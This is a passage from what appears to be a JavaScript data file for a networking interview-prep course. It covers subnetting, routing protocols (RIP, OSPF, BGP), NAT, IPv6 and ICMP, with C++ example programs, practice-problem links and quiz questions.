class="learn-p">Key fields: <b>TTL</b> (Time To Live — decremented at each router, prevents infinite loops), <b>Protocol</b> (6=TCP, 17=UDP, 1=ICMP), <b>Flags</b> (DF=Don\'t Fragment, MF=More Fragments).</p></div><div class="learn-section"><div class="learn-h">Supernetting (Route Aggregation)</div><p class="learn-p"><b>Supernetting</b> is the opposite of subnetting — it combines multiple smaller networks into a single larger network prefix. This is used in routing tables to reduce the number of entries (route aggregation).</p><div class="learn-code">Networks: 192.168.0.0/24, 192.168.1.0/24, 192.168.2.0/24, 192.168.3.0/24\nSupernet: 192.168.0.0/22  (combines all 4 /24 networks)\n\nBinary analysis:\n192.168.0.xxx = 192.168.000000 00.xxxxxxxx\n192.168.1.xxx = 192.168.000000 01.xxxxxxxx\n192.168.2.xxx = 192.168.000000 10.xxxxxxxx\n192.168.3.xxx = 192.168.000000 11.xxxxxxxx\nCommon prefix: 22 bits  &rarr; /22</div></div><div class="learn-section"><div class="learn-h">Interview Spotlight</div><p class="learn-p"><b>Q1: Given 192.168.10.65/27, find the network, broadcast, and usable range.</b><br>A: /27 means 27 network bits, 5 host bits. Block size = 2^5 = 32. 65 / 32 = 2.03, so the 3rd subnet starts at 64. Network = 192.168.10.64, Broadcast = 192.168.10.95, Usable range = .65 to .94, Usable hosts = 30.</p><p class="learn-p"><b>Q2: How many /26 subnets from a /24 network?</b><br>A: Borrow 2 bits (26-24=2), giving 2^2 = 4 subnets, each with 2^6 - 2 = 62 usable hosts.</p><p class="learn-p"><b>Q3: What is NAT and what are its types?</b><br>A: NAT translates private IPs to public IPs. Types: Static (1:1 mapping), Dynamic (pool of public IPs), PAT/NAT Overload (many private IPs share one public IP differentiated by port numbers — most common in home routers).</p><p class="learn-p"><b>Q4: What is supernetting?</b><br>A: Supernetting combines multiple contiguous smaller networks into one larger prefix. Four /24 networks (192.168.0.0 through 192.168.3.0) aggregate into 192.168.0.0/22. Used to reduce routing table size.</p><p class="learn-p"><b>Q5: Why subtract 2 from 2^h for usable hosts?</b><br>A: The first address (all host bits 0) is the network address and the last (all host bits 1) is the broadcast address. Neither can be assigned to a host.</p><p class="learn-p"><b>Q6: What is APIPA (169.254.x.x)?</b><br>A: Link-local address from 169.254.0.0/16 assigned when DHCP fails. Allows basic local-subnet communication but is not routable. Seeing 169.254.x.x typically indicates a DHCP problem.</p></div>',
          code: `// === IPv4 Subnetting Calculator in C++ ===
#include <iostream>
#include <string>
#include <sstream>
#include <vector>
#include <cmath>
#include <bitset>
using namespace std;

// Convert dotted decimal IP to 32-bit integer
uint32_t ipToInt(const string& ip) {
    uint32_t result = 0;
    int octet;
    char dot;
    istringstream iss(ip);
    for (int i = 0; i < 4; i++) {
        iss >> octet;
        if (i < 3) iss >> dot;
        result = (result << 8) | (octet & 0xFF);
    }
    return result;
}

// Convert 32-bit integer to dotted decimal
string intToIP(uint32_t ip) {
    return to_string((ip >> 24) & 0xFF) + "." +
           to_string((ip >> 16) & 0xFF) + "." +
           to_string((ip >> 8) & 0xFF)  + "." +
           to_string(ip & 0xFF);
}

// Generate subnet mask from prefix length
uint32_t prefixToMask(int prefix) {
    if (prefix == 0) return 0;
    return ~((1U << (32 - prefix)) - 1);
}

// Subnet Calculator
void subnetCalculator(const string& ipStr, int prefix) {
    uint32_t ip = ipToInt(ipStr);
    uint32_t mask = prefixToMask(prefix);
    uint32_t network = ip & mask;
    uint32_t broadcast = network | ~mask;
    uint32_t firstHost = network + 1;
    uint32_t lastHost = broadcast - 1;
    int hostBits = 32 - prefix;
    int totalHosts = (1 << hostBits) - 2;

    cout << "=== Subnet Calculator ===" << endl;
    cout << "IP Address:     " << ipStr << "/" << prefix << endl;
    cout << "Subnet Mask:    " << intToIP(mask) << endl;
    cout << "Network:        " << intToIP(network) << endl;
    cout << "Broadcast:      " << intToIP(broadcast) << endl;
    cout << "First Host:     " << intToIP(firstHost) << endl;
    cout << "Last Host:      " << intToIP(lastHost) << endl;
    cout << "Total Hosts:    " << totalHosts << endl;
    cout << "Binary IP:      " << bitset<32>(ip) << endl;
    cout << "Binary Mask:    " << bitset<32>(mask) << endl;
}

// VLSM Subnetting: divide a network into subnets of different sizes
void vlsmSubnetting(const string& networkStr, int prefix,
                    vector<int> hostRequirements) {
    cout << "\\n=== VLSM Subnetting ===" << endl;
    cout << "Network: " << networkStr << "/" << prefix << endl;

    // Sort requirements in descending order (largest first)
    sort(hostRequirements.rbegin(), hostRequirements.rend());

    uint32_t currentNet = ipToInt(networkStr) & prefixToMask(prefix);

    for (int i = 0; i < (int)hostRequirements.size(); i++) {
        int needed = hostRequirements[i];
        // Find smallest power of 2 >= needed + 2
        int hostBits = 1;
        while ((1 << hostBits) - 2 < needed) hostBits++;
        int subnetPrefix = 32 - hostBits;
        uint32_t subnetMask = prefixToMask(subnetPrefix);
        uint32_t broadcast = currentNet | ~subnetMask;

        cout << "\\nSubnet " << i << " (need " << needed << " hosts):" << endl;
        cout << "  Network:   " << intToIP(currentNet) << "/" << subnetPrefix << endl;
        cout << "  Mask:      " << intToIP(subnetMask) << endl;
        cout << "  Range:     " << intToIP(currentNet + 1) << " - "
             << intToIP(broadcast - 1) << endl;
        cout << "  Broadcast: " << intToIP(broadcast) << endl;
        cout << "  Usable:    " << ((1 << hostBits) - 2) << " hosts" << endl;

        // Move to next subnet
        currentNet = broadcast + 1;
    }
}

// Determine IP class
string getClass(const string& ip) {
    int firstOctet = stoi(ip.substr(0, ip.find('.')));
    if (firstOctet >= 1 && firstOctet <= 126) return "Class A";
    if (firstOctet >= 128 && firstOctet <= 191) return "Class B";
    if (firstOctet >= 192 && firstOctet <= 223) return "Class C";
    if (firstOctet >= 224 && firstOctet <= 239) return "Class D (Multicast)";
    return "Class E (Reserved)";
}

// Check if two IPs are on the same subnet
bool sameSubnet(const string& ip1, const string& ip2, int prefix) {
    uint32_t mask = prefixToMask(prefix);
    return (ipToInt(ip1) & mask) == (ipToInt(ip2) & mask);
}

int main() {
    subnetCalculator("192.168.1.130", 26);

    cout << "\\n--- IP Classification ---" << endl;
    vector<string> ips = {"10.0.0.1", "172.16.5.1", "192.168.1.1",
                          "224.0.0.1", "8.8.8.8"};
    for (auto& ip : ips)
        cout << ip << " -> " << getClass(ip) << endl;

    cout << "\\n--- Same Subnet? ---" << endl;
    cout << "192.168.1.10 & 192.168.1.200 on /24: "
         << (sameSubnet("192.168.1.10","192.168.1.200",24) ? "YES":"NO") << endl;
    cout << "192.168.1.10 & 192.168.1.200 on /26: "
         << (sameSubnet("192.168.1.10","192.168.1.200",26) ? "YES":"NO") << endl;

    // VLSM example: divide 10.0.0.0/24 into subnets for 100, 50, 25, 10 hosts
    vlsmSubnetting("10.0.0.0", 24, {100, 50, 25, 10});

    return 0;
}`,
          problems: [
            ['Subnetting Practice on GFG', 'https://www.geeksforgeeks.org/introduction-to-subnetting/', 'Medium'],
            ['IP Address Defanging (LeetCode 1108)', 'https://leetcode.com/problems/defanging-an-ip-address/', 'Easy'],
            ['Restore IP Addresses (LeetCode 93)', 'https://leetcode.com/problems/restore-ip-addresses/', 'Medium'],
            ['VLSM Subnetting Problems', 'https://www.geeksforgeeks.org/introduction-of-variable-length-subnet-mask-vlsm/', 'Hard'],
            ['CIDR and Supernetting Problems', 'https://www.geeksforgeeks.org/supernetting-in-network-layer/', 'Hard'],
            ['Validate IP Address (LeetCode 468)', 'https://leetcode.com/problems/validate-ip-address/', 'Medium']
          ],
          mcqs: [
            {q: 'How many usable host addresses are in a /26 subnet?', o: ['64', '62', '30', '126'], a: 1},
            {q: 'Which private IP range belongs to Class B?', o: ['10.0.0.0/8', '172.16.0.0/12', '192.168.0.0/16', '169.254.0.0/16'], a: 1},
            {q: 'A host has IP 192.168.10.65/27. What is its subnet\'s broadcast address?', o: ['192.168.10.95', '192.168.10.63', '192.168.10.127', '192.168.10.79'], a: 0},
            {q: 'The subnet mask 255.255.255.224 corresponds to which CIDR prefix?', o: ['/24', '/25', '/26', '/27'], a: 3},
            {q: 'How many bits are in an IPv4 address?', o: ['16', '32', '64', '128'], a: 1},
            {q: 'Which address is used for limited broadcast?', o: ['0.0.0.0', '127.0.0.1', '255.255.255.255', '192.168.1.255'], a: 2},
            {q: 'VLSM stands for:', o: ['Virtual Local Subnet Mask', 'Variable Length Subnet Mask', 'Very Large Subnet Mapping', 'Virtual LAN Subnet Mode'], a: 1},
            {q: 'The default subnet mask for Class B is:', o: ['255.0.0.0', '255.255.0.0', '255.255.255.0', '255.255.255.128'], a: 1}
          ],
        },
        {
          t: 'Routing Protocols',
          learn: '<div class="learn-section"><div class="learn-h">Why This Matters</div><p class="learn-p">When a packet travels from your laptop in New York to a server in Tokyo, it passes through 15-20 routers, each making an independent forwarding decision. <b>Routing protocols</b> automatically build and maintain routing tables so routers know the best path. The 2021 Facebook outage (6 hours, billions in losses) was caused by a BGP misconfiguration. Understanding routing — from Dijkstra\'s algorithm in OSPF to policy-based BGP — is essential for networking interviews.</p></div><div class="learn-section"><div class="learn-h">What is Routing?</div><p class="learn-p"><b>Routing</b> is the process of selecting the best path for a packet to travel from source to destination across interconnected networks. <b>Routers</b> maintain <b>routing tables</b> that map destination network prefixes to next-hop addresses and output interfaces. Routing can be <b>static</b> (manually configured) or <b>dynamic</b> (learned via routing protocols).</p><p class="learn-p">A routing table entry typically contains: <b>Destination network</b>, <b>Subnet mask</b>, <b>Next hop</b>, <b>Interface</b>, and <b>Metric</b> (cost). When a packet arrives, the router performs <b>longest prefix matching</b> to find the best route.</p></div><div class="learn-section"><div class="learn-h">Longest Prefix Match</div><p class="learn-p">When multiple routing table entries match a destination IP, the router uses the entry with the <b>longest (most specific) matching prefix</b>. This is the fundamental forwarding algorithm used in IP routing.</p><div class="learn-code">Routing Table:\n  10.0.0.0/8      ->  Interface A\n  10.1.0.0/16     ->  Interface B\n  10.1.1.0/24     ->  Interface C\n  0.0.0.0/0       ->  Interface D  (default route)\n\nPacket to 10.1.1.50:\n  Matches /8, /16, AND /24.  Longest prefix = /24 &rarr; Interface C\n\nPacket to 10.2.3.4:\n  Matches only /8.  &rarr; Interface A\n\nPacket to 8.8.8.8:\n  No specific match.  &rarr; Default route (Interface D)</div></div><div class="learn-section"><div class="learn-h">Interior vs Exterior Routing Protocols</div><p class="learn-p">The Internet is divided into <b>Autonomous Systems (AS)</b>. Each AS is a collection of networks under a single administrative authority (e.g., an ISP, a company).</p><ul class="learn-list"><li><b>IGP (Interior Gateway Protocol):</b> Routes within an AS. Examples: RIP, OSPF, EIGRP, IS-IS.</li><li><b>EGP (Exterior Gateway Protocol):</b> Routes between ASes. The primary example today is <b>BGP</b>.</li></ul></div><div class="learn-section"><div class="learn-h">Distance Vector Routing — RIP</div><p class="learn-p"><b>Distance Vector</b> protocols use the <b>Bellman-Ford algorithm</b>. Each router maintains a table of <b>(destination, distance, next hop)</b> and periodically shares its entire routing table with its <b>directly connected neighbors</b>.</p><p class="learn-p"><b>RIP (Routing Information Protocol):</b></p><ul class="learn-list"><li>Metric: <b>Hop count</b> (maximum 15; 16 = unreachable).</li><li>Updates sent every <b>30 seconds</b> via broadcast/multicast.</li><li>Uses <b>UDP port 520</b>.</li><li>Converges slowly ("counting to infinity" problem).</li></ul><p class="learn-p"><b>Count to Infinity Problem:</b> When a link goes down, routers may keep incrementing the hop count in a loop, slowly counting up to infinity (16). Solutions include:</p><ul class="learn-list"><li><b>Split Horizon:</b> Don\'t advertise a route back to the neighbor you learned it from.</li><li><b>Poison Reverse:</b> Advertise the failed route with metric = infinity (16) back to the neighbor.</li><li><b>Triggered Updates:</b> Send immediate updates when a topology change occurs (don\'t wait 30s).</li><li><b>Hold-Down Timer:</b> After learning of a failure, ignore updates about that route for a period.</li></ul><div class="learn-code">Bellman-Ford Update Rule:\nFor each destination d:\n  D(x, d) = min over all neighbors v { cost(x,v) + D(v,d) }\n\nRouter A\'s table after exchange with neighbor B:\n  Dest | Cost via B\n  C    | cost(A,B) + D(B,C) = 1 + 2 = 3\n  D    | cost(A,B) + D(B,D) = 1 + 1 = 2</div></div><div class="learn-section"><div class="learn-h">Link State Routing — OSPF</div><p class="learn-p"><b>Link State</b> protocols use <b>Dijkstra\'s algorithm</b>. Each router discovers its neighbors, measures link costs, constructs a <b>Link State Advertisement (LSA)</b>, floods it to <b>all</b> routers in the area, and independently computes the shortest path tree using Dijkstra.</p><p class="learn-p"><b>OSPF (Open Shortest Path First):</b></p><ul class="learn-list"><li>Metric: <b>Cost</b> (typically based on bandwidth: cost = 10^8 / bandwidth in bps).</li><li>Uses <b>IP protocol 89</b> directly (not TCP/UDP).</li><li>Supports <b>areas</b> for hierarchical routing (Area 0 is the backbone).</li><li>Fast convergence via immediate LSA flooding.</li><li>Supports <b>equal-cost multi-path (ECMP)</b> routing.</li><li>Uses <b>Designated Router (DR)</b> and <b>Backup DR (BDR)</b> on broadcast networks to reduce LSA flooding overhead.</li></ul><div class="learn-code">Dijkstra\'s Algorithm (SPF Calculation):\n1. Initialize: dist[source] = 0, dist[all others] = infinity\n2. Add source to SPF tree\n3. For each node u in SPF tree:\n   For each neighbor v of u:\n     If dist[u] + cost(u,v) &lt; dist[v]:\n       dist[v] = dist[u] + cost(u,v)\n       next_hop[v] = (via u)\n4. Pick unvisited node with smallest dist, add to tree\n5. Repeat until all nodes in tree</div></div><div class="learn-section"><div class="learn-h">Distance Vector vs Link State</div><table class="learn-table"><tr><th>Feature</th><th>Distance Vector (RIP)</th><th>Link State (OSPF)</th></tr><tr><td>Algorithm</td><td>Bellman-Ford</td><td>Dijkstra</td></tr><tr><td>Knowledge</td><td>Only neighbors\' tables</td><td>Entire network topology</td></tr><tr><td>Updates</td><td>Periodic (every 30s), full table</td><td>Event-driven, LSA floods</td></tr><tr><td>Convergence</td><td>Slow</td><td>Fast</td></tr><tr><td>Scalability</td><td>Small networks (max 15 hops)</td><td>Large networks (area hierarchy)</td></tr><tr><td>Loop Prevention</td><td>Split horizon, poison reverse</td><td>Inherent (complete topology)</td></tr><tr><td>CPU/Memory</td><td>Low</td><td>Higher (stores full topology)</td></tr></table></div><div class="learn-section"><div class="learn-h">BGP (Border Gateway Protocol)</div><p class="learn-p"><b>BGP</b> is the <b>only EGP in use today</b> and is responsible for routing between Autonomous Systems on the Internet. It is a <b>path vector</b> protocol — it maintains the full AS path to prevent loops.</p><ul class="learn-list"><li>Uses <b>TCP port 179</b> for reliable delivery.</li><li><b>eBGP:</b> Between different ASes (external). <b>iBGP:</b> Within the same AS (internal).</li><li>Path selection considers: AS path length, local preference, MED, origin type, etc.</li><li>BGP does NOT find the "shortest" path — it uses <b>policy-based routing</b>.</li><li>The Internet\'s <b>default-free zone (DFZ)</b> BGP table contains ~900,000+ prefixes (as of 2024).</li></ul><div class="learn-tip"><b>Tip:</b> In interviews, know that BGP is the "glue of the Internet." Major Internet outages (like the Facebook 2021 outage) are often caused by BGP misconfigurations.</div></div><div class="learn-section"><div class="learn-h">ICMP and Traceroute</div><p class="learn-p"><b>ICMP (Internet Control Message Protocol)</b> operates at the Network Layer and is used for error reporting and diagnostics. Key ICMP messages:</p><ul class="learn-list"><li><b>Echo Request/Reply (Type 8/0):</b> Used by <code>ping</code>.</li><li><b>Destination Unreachable (Type 3):</b> Network/host/port unreachable.</li><li><b>Time Exceeded (Type 11):</b> TTL expired — used by <code>traceroute</code>.</li><li><b>Redirect (Type 5):</b> Informs host of a better route.</li></ul><p class="learn-p"><b>Traceroute</b> works by sending packets with incrementing TTL values (1, 2, 3, ...). Each router along the path decrements TTL and sends back an ICMP Time Exceeded message when TTL reaches 0, revealing its IP address.</p></div><div class="learn-section"><div class="learn-h">NAT (Network Address Translation)</div><p class="learn-p">NAT translates <b>private IP addresses</b> to <b>public IP addresses</b> (and vice versa) at the router. Types:</p><ul class="learn-list"><li><b>Static NAT:</b> One-to-one mapping (private IP &harr; public IP).</li><li><b>Dynamic NAT:</b> Maps from a pool of public IPs.</li><li><b>PAT (Port Address Translation) / NAT Overload:</b> Many private IPs share one public IP, differentiated by port numbers. Most common in home routers.</li></ul></div><div class="learn-section"><div class="learn-h">Interview Spotlight</div><p class="learn-p"><b>Q1: Compare Dijkstra\'s and Bellman-Ford in routing context.</b><br>A: Dijkstra (OSPF) runs on a complete topology map, O(V^2) or O((V+E)logV) with priority queue, requires full network knowledge. Bellman-Ford (RIP) works distributedly, each router only needs neighbor info, O(VE). Dijkstra converges faster; Bellman-Ford is simpler but prone to count-to-infinity.</p><p class="learn-p"><b>Q2: What is the count-to-infinity problem?</b><br>A: When a link fails in distance vector networks, routers keep incrementing the metric in a loop. Solutions: Split Horizon, Poison Reverse, Triggered Updates, Hold-Down Timer.</p><p class="learn-p"><b>Q3: What is longest prefix match?</b><br>A: When multiple routing entries match, the router uses the most specific (longest) prefix. For 10.1.1.50 with entries /8, /16, /24 — /24 wins. Enables hierarchical aggregation with exceptions.</p><p class="learn-p"><b>Q4: Why does BGP use TCP while OSPF runs on IP?</b><br>A: BGP peers can be multiple hops apart and need reliable delivery, making TCP (port 179) appropriate. OSPF operates within an AS with directly connected neighbors and uses its own reliability on IP (protocol 89).</p><p class="learn-p"><b>Q5: What caused the Facebook 2021 outage?</b><br>A: A maintenance command accidentally withdrew all BGP route advertisements. DNS servers inside Facebook\'s network became unreachable. Engineers couldn\'t remotely fix it (network was down) and had to physically access data centers. Outage lasted ~6 hours.</p></div>',
          code: `// === Routing Algorithms in C++ ===
// Dijkstra (OSPF) and Bellman-Ford (RIP) implementations
#include <iostream>
#include <vector>
#include <queue>
#include <climits>
#include <tuple>
using namespace std;

const int INF = INT_MAX;

// ---- Dijkstra's Algorithm (used by OSPF) ----
struct Edge {
    int to, cost;
};

void dijkstra(int src, vector<vector<Edge>>& graph, int n) {
    vector<int> dist(n, INF);
    vector<int> parent(n, -1);
    vector<bool> visited(n, false);
    // min-heap: (distance, node)
    priority_queue<pair<int,int>, vector<pair<int,int>>,
                   greater<pair<int,int>>> pq;

    dist[src] = 0;
    pq.push({0, src});

    while (!pq.empty()) {
        auto [d, u] = pq.top(); pq.pop();
        if (visited[u]) continue;
        visited[u] = true;

        for (auto& [v, w] : graph[u]) {
            if (dist[u] + w < dist[v]) {
                dist[v] = dist[u] + w;
                parent[v] = u;
                pq.push({dist[v], v});
            }
        }
    }

    cout << "=== Dijkstra (OSPF SPF) from node " << src << " ===" << endl;
    for (int i = 0; i < n; i++) {
        cout << "  To node " << i << ": cost = ";
        if (dist[i] == INF) cout << "INF";
        else cout << dist[i];

        // Print path
        if (dist[i] != INF && i != src) {
            vector<int> path;
            for (int v = i; v != -1; v = parent[v])
                path.push_back(v);
            cout << "  Path: ";
            for (int j = path.size()-1; j >= 0; j--) {
                cout << path[j];
                if (j > 0) cout << " -> ";
            }
        }
        cout << endl;
    }
}

// ---- Bellman-Ford Algorithm (used by RIP) ----
struct WeightedEdge {
    int from, to, cost;
};

void bellmanFord(int src, vector<WeightedEdge>& edges, int n) {
    vector<int> dist(n, INF);
    vector<int> parent(n, -1);
    dist[src] = 0;

    // Relax all edges (n-1) times
    for (int i = 0; i < n - 1; i++) {
        bool updated = false;
        for (auto& [u, v, w] : edges) {
            if (dist[u] != INF && dist[u] + w < dist[v]) {
                dist[v] = dist[u] + w;
                parent[v] = u;
                updated = true;
            }
        }
        if (!updated) break; // early termination
    }

    // Check for negative cycles
    bool negativeCycle = false;
    for (auto& [u, v, w] : edges) {
        if (dist[u] != INF && dist[u] + w < dist[v]) {
            negativeCycle = true;
            break;
        }
    }

    cout << "\\n=== Bellman-Ford (RIP) from node " << src << " ===" << endl;
    if (negativeCycle) {
        cout << "  Negative cycle detected!" << endl;
        return;
    }
    for (int i = 0; i < n; i++) {
        cout << "  To node " << i << ": cost = ";
        if (dist[i] == INF) cout << "INF";
        else cout << dist[i];
        cout << endl;
    }
}

// ---- Longest Prefix Match Simulation ----
struct RouteEntry {
    uint32_t network;
    int prefix;
    string nextHop;
};

uint32_t ipToInt(int a, int b, int c, int d) {
    return (a << 24) | (b << 16) | (c << 8) | d;
}

string longestPrefixMatch(uint32_t destIP, vector<RouteEntry>& table) {
    int bestPrefix = -1;
    string bestHop = "DROP";

    for (auto& entry : table) {
        uint32_t mask = (entry.prefix == 0) ? 0 :
                        ~((1U << (32 - entry.prefix)) - 1);
        if ((destIP & mask) == (entry.network & mask)) {
            if (entry.prefix > bestPrefix) {
                bestPrefix = entry.prefix;
                bestHop = entry.nextHop;
            }
        }
    }
    return bestHop;
}

int main() {
    // Build a sample network graph (5 routers)
    // 0 -- 1 (cost 4), 0 -- 2 (cost 1), 1 -- 3 (cost 1)
    // 2 -- 1 (cost 2), 2 -- 3 (cost 5), 3 -- 4 (cost 3)
    int n = 5;
    vector<vector<Edge>> graph(n);
    graph[0] = {{1,4}, {2,1}};
    graph[1] = {{0,4}, {2,2}, {3,1}};
    graph[2] = {{0,1}, {1,2}, {3,5}};
    graph[3] = {{1,1}, {2,5}, {4,3}};
    graph[4] = {{3,3}};

    dijkstra(0, graph, n);

    // Bellman-Ford with edge list
    vector<WeightedEdge> edges = {
        {0,1,4},{0,2,1},{1,0,4},{1,2,2},{1,3,1},
        {2,0,1},{2,1,2},{2,3,5},{3,1,1},{3,2,5},
        {3,4,3},{4,3,3}
    };
    bellmanFord(0, edges, n);

    // Longest Prefix Match
    cout << "\\n=== Longest Prefix Match ===" << endl;
    vector<RouteEntry> routeTable = {
        {ipToInt(10,0,0,0),   8,  "InterfaceA"},
        {ipToInt(10,1,0,0),   16, "InterfaceB"},
        {ipToInt(10,1,1,0),   24, "InterfaceC"},
        {ipToInt(0,0,0,0),    0,  "Default"}
    };

    uint32_t test1 = ipToInt(10,1,1,50);
    uint32_t test2 = ipToInt(10,2,3,4);
    uint32_t test3 = ipToInt(8,8,8,8);
    cout << "10.1.1.50 -> " << longestPrefixMatch(test1, routeTable) << endl;
    cout << "10.2.3.4  -> " << longestPrefixMatch(test2, routeTable) << endl;
    cout << "8.8.8.8   -> " << longestPrefixMatch(test3, routeTable) << endl;

    return 0;
}`,
          problems: [
            ['Network Delay Time (LeetCode 743)', 'https://leetcode.com/problems/network-delay-time/', 'Medium'],
            ['Cheapest Flights Within K Stops (LeetCode 787)', 'https://leetcode.com/problems/cheapest-flights-within-k-stops/', 'Medium'],
            ['Routing Protocols Comparison', 'https://www.geeksforgeeks.org/difference-between-rip-and-ospf/', 'Easy'],
            ['OSPF vs RIP Detailed Comparison', 'https://www.geeksforgeeks.org/difference-between-rip-and-ospf/', 'Medium'],
            ['BGP Basics and Path Selection', 'https://www.geeksforgeeks.org/border-gateway-protocol-bgp/', 'Hard'],
            ['Longest Prefix Match Problems', 'https://www.geeksforgeeks.org/longest-prefix-matching-in-routers/', 'Medium']
          ],
          mcqs: [
            {q: 'OSPF uses which shortest-path algorithm?', o: ['Bellman-Ford', 'Floyd-Warshall', 'Dijkstra', 'A* Search'], a: 2},
            {q: 'BGP operates on which TCP port?', o: ['80', '520', '179', '443'], a: 2},
            {q: 'Which problem is specific to Distance Vector routing protocols?', o: ['LSA flooding', 'Area partitioning', 'Count to infinity', 'Designated router election'], a: 2},
            {q: 'RIP uses which transport protocol and port?', o: ['TCP 520', 'UDP 520', 'TCP 179', 'UDP 179'], a: 1},
            {q: 'OSPF metric is typically based on:', o: ['Hop count', 'Bandwidth (cost = 10^8/bandwidth)', 'Delay', 'Reliability'], a: 1},
            {q: 'Which protocol handles inter-AS routing?', o: ['OSPF', 'RIP', 'EIGRP', 'BGP'], a: 3},
            {q: 'In OSPF, the backbone area is:', o: ['Area 255', 'Area 0', 'Area 1', 'Area ANY'], a: 1},
            {q: 'Split Horizon prevents:', o: ['Packet fragmentation', 'Count-to-infinity loops', 'BGP hijacking', 'ARP spoofing'], a: 1}
          ],
        },
        {
          t: 'IPv6 & ICMP',
          learn: '<div class="learn-section"><div class="learn-h">Why This Matters</div><p class="learn-p">IPv4 addresses officially ran out in 2011 (IANA) and regionally by 2019. With billions of IoT devices coming online, <b>IPv6</b> with its 128-bit address space (3.4 x 10^38 addresses) is inevitable. Major cloud providers and mobile networks already run dual-stack. <b>ICMP</b> is the protocol behind <code>ping</code> and <code>traceroute</code> — the first tools any engineer reaches for when debugging network connectivity. Understanding both is essential for modern networking interviews.</p></div><div class="learn-section"><div class="learn-h">Why IPv6?</div><p class="learn-p">IPv4 uses 32-bit addresses (~4.3 billion), which are <b>exhausted</b>. IPv6 uses <b>128-bit addresses</b> (~3.4 × 10³⁸), solving the address shortage. IPv6 also improves routing efficiency, security (mandatory IPsec support), and eliminates the need for NAT.</p></div><div class="learn-section"><div class="learn-h">IPv6 Address Format</div><div class="learn-code">Full:       2001:0db8:0000:0000:0000:0000:0000:0001\nShortened:  2001:db8::1  (:: replaces consecutive groups of zeros)\n\nNotation: 8 groups of 4 hex digits, separated by colons\nPrefix:   2001:db8::/32 (similar to CIDR notation)\n\nSpecial addresses:\n::1          — Loopback (like 127.0.0.1 in IPv4)\n::           — Unspecified (like 0.0.0.0)\nfe80::/10    — Link-local (auto-configured, non-routable)\nff00::/8     — Multicast\n2000::/3     — Global unicast (publicly routable)</div></div><div class="learn-section"><div class="learn-h">IPv6 Header (Simplified)</div><p class="learn-p">IPv6 has a <b>fixed 40-byte header</b> (vs IPv4\'s variable 20-60 bytes). This simplifies router processing.</p><div class="learn-code">IPv6 Header Fields:\n| Version (4 bits) = 6                    |\n| Traffic Class (8 bits) — QoS priority   |\n| Flow Label (20 bits) — identifies flows  |\n| Payload Length (16 bits)                |\n| Next Header (8 bits) — protocol (TCP=6) |\n| Hop Limit (8 bits) — like TTL in IPv4   |\n| Source Address (128 bits)               |\n| Destination Address (128 bits)          |</div><p class="learn-p"><b>Key differences from IPv4:</b></p><table class="learn-table"><tr><th>Feature</th><th>IPv4</th><th>IPv6</th></tr><tr><td>Address size</td><td>32 bits</td><td>128 bits</td></tr><tr><td>Header size</td><td>Variable (20-60 bytes)</td><td>Fixed (40 bytes)</td></tr><tr><td>Header checksum</td><td>Yes</td><td>No (handled by upper layers)</td></tr><tr><td>Fragmentation</td><td>Routers can fragment</td><td>Only source host fragments</td></tr><tr><td>Broadcast</td><td>Yes</td><td>No (replaced by multicast/anycast)</td></tr><tr><td>NAT</td><td>Common</td><td>Not needed (enough addresses)</td></tr><tr><td>IPsec</td><td>Optional</td><td>Mandatory support</td></tr><tr><td>Configuration</td><td>DHCP or manual</td><td>SLAAC (Stateless Address Auto-Configuration) or DHCPv6</td></tr></table></div><div class="learn-section"><div class="learn-h">IPv4 to IPv6 Transition</div><p class="learn-p">Since both protocols coexist, three main transition mechanisms are used:</p><ul class="learn-list"><li><b>Dual Stack:</b> Nodes run both IPv4 and IPv6 simultaneously. Preferred method.</li><li><b>Tunneling (6in4, 6to4):</b> IPv6 packets encapsulated inside IPv4 packets to traverse IPv4 networks.</li><li><b>NAT64/DNS64:</b> Translates between IPv4 and IPv6. Allows IPv6-only hosts to communicate with IPv4 servers.</li></ul></div><div class="learn-section"><div class="learn-h">ICMP (Internet Control Message Protocol)</div><p class="learn-p"><b>ICMP</b> is a <b>network-layer protocol</b> used for error reporting and diagnostics. It rides on top of IP (protocol number 1 for ICMPv4, 58 for ICMPv6).</p><p class="learn-p"><b>Common ICMP message types:</b></p><table class="learn-table"><tr><th>Type</th><th>Name</th><th>Purpose</th></tr><tr><td>0</td><td>Echo Reply</td><td>Response to ping</td></tr><tr><td>3</td><td>Destination Unreachable</td><td>Host/network/port unreachable</td></tr><tr><td>5</td><td>Redirect</td><td>Inform host of better route</td></tr><tr><td>8</td><td>Echo Request</td><td>Ping request</td></tr><tr><td>11</td><td>Time Exceeded</td><td>TTL expired (used by traceroute)</td></tr></table></div><div class="learn-section"><div class="learn-h">ping &amp; traceroute</div><p class="learn-p"><b>ping</b> sends ICMP Echo Request (type 8) and waits for Echo Reply (type 0). Measures round-trip time and packet loss.</p><p class="learn-p"><b>traceroute</b> sends packets with incrementing TTL values (1, 2, 3...). Each router that decrements TTL to 0 sends back an ICMP Time Exceeded message, revealing its IP address. This maps the network path.</p><div class="learn-code">$ traceroute google.com\n1  192.168.1.1      1.2 ms    (home router, TTL=1 expired here)\n2  10.0.0.1         5.3 ms    (ISP gateway, TTL=2 expired here)\n3  72.14.233.128    12.1 ms   (Google edge)\n4  142.250.80.46    11.8 ms   (destination)</div><div class="learn-tip"><b>Interview tip:</b> "How does traceroute work?" is a common networking interview question. Answer: sends UDP (Linux) or ICMP (Windows) packets with incrementing TTL; each hop returns ICMP Time Exceeded; destination returns ICMP Port Unreachable (UDP) or Echo Reply (ICMP).</div></div><div class="learn-section"><div class="learn-h">Interview Spotlight</div><p class="learn-p"><b>Q1: Key differences between IPv4 and IPv6 headers?</b><br>A: IPv6: fixed 40-byte header (vs variable 20-60). Removes: header checksum, router fragmentation, broadcast. Adds: Flow Label, mandatory IPsec, SLAAC. Next Header field replaces Protocol, enabling extension header chaining.</p><p class="learn-p"><b>Q2: How does traceroute work?</b><br>A: Sends packets with incrementing TTL (1, 2, 3...). Each router that decrements TTL to 0 returns ICMP Time Exceeded (Type 11), revealing its IP. Destination returns ICMP Echo Reply (Windows) or Port Unreachable (Linux/UDP). Maps the entire path.</p><p class="learn-p"><b>Q3: Three IPv4-to-IPv6 transition mechanisms?</b><br>A: (1) Dual Stack — nodes run both protocols. (2) Tunneling — IPv6 encapsulated inside IPv4 packets. (3) NAT64/DNS64 — translates between protocols for IPv6-only hosts reaching IPv4 servers.</p><p class="learn-p"><b>Q4: Why did IPv6 remove the header checksum?</b><br>A: IPv4 header checksum must be recalculated at every hop (TTL changes), adding overhead. TCP/UDP already have checksums, and Ethernet has CRC, so the header checksum was redundant. Removing it speeds up router processing.</p><p class="learn-p"><b>Q5: What is the :: notation in 